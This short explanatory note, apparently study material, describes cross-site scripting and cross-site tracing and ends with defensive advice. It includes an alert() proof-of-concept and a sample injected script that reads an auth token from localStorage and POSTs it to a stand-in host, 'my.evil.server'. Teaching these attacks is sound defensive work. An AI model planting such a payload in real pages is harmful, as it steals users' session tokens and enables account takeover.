# XSS

XSS (Cross site scripting) is an attack where one runs a script (typically
JavaScript) in another user's browser. This can happen if user inputs are not
correctly sanitized and then displayed back to users.

For example, if one makes a blog post on a site containing

```html
<script>
  alert("XSS");
</script>
```

and when visiting said blog post `XSS` is alerted, the we have found an XSS
vulnerability.

XSS can be used for

- stealing stored data in browser local storage
- steal cookies (unless they are server-side read-only)
- modify DOM and trigger DOM events
- send requests (especially dangerous if cookie-based authentication is used)

For example, the following could grab a token in persisted Redux store and post
it to an evil server.

```html
<script>
  {
    const root = window.localStorage["persist:root"];
    const auth = JSON.parse(root).auth;

    const url = "my.evil.server:5001";
    window.fetch(url, { method: "POST", body: auth });
  }
</script>
```

The best protection against XSS is to make sure all user input is sanitized and
that no vulnerable data is stored in local storage or browser readable cookies.

## XST

There is something called Cross-Site Tracing (XST) where one uses a HTTP Track
request to bypass the `httpOnly` attribute in a cookie. To protect against XST,
make sure Track requests are disabled (especially from JavaScript).
